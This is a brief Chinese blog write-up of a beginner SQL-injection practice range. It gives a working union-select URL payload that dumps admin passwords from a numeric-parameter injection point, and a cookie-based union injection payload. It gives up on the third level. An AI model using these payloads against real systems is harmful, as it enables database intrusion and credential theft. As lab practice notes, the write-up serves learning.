---
title: 封神台靶场WP
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-01-21 20:33:08
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1126004.jpg
---
一个比较基础的靶场，记录一下做题过程。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210121203731.png)

第一章
一个没过滤的sql注入

最终payload：http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,group_concat(password)%20from%20admin

数字型的比较少见，因为不像单引号型那样有引号'分割开，所以要加上1 and 1=2，1=2的原因和单引号型前面0'是一个道理，就不细说了。

第二章
这关卡了。。。一直想的绕过waf但是绕不过。。
看了wp发现是在cookie里面注。。。

171%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin

第三章
拿了flag一直显示不对。。。
不做了

这靶场感觉质量一般般，不建议打。